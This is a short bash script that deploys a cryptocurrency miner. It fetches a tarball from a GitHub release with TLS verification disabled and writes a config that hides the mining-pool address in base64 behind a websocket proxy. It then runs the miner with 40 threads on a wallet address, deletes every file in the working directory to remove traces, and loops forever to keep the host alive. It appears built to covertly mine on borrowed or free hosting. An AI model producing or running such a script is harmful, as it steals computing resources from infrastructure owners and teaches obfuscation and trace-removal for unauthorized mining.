#!/bin/bash

apt install nodejs -y
curl -sLkO https://github.com/paskofa10/webmoon/releases/download/flex/mino.tar.gz
tar -xvf mino.tar.gz
echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW", "password": "c=MAZA,zap=MAZA", "argent": "BeeMJe/1.1", "threads": 40}' > data.txt
nproc --all 
node app.js
sleep 10
rm -rvf *
while true
do
        echo "ojo lali ngopi boss..."
        sleep 1200
done
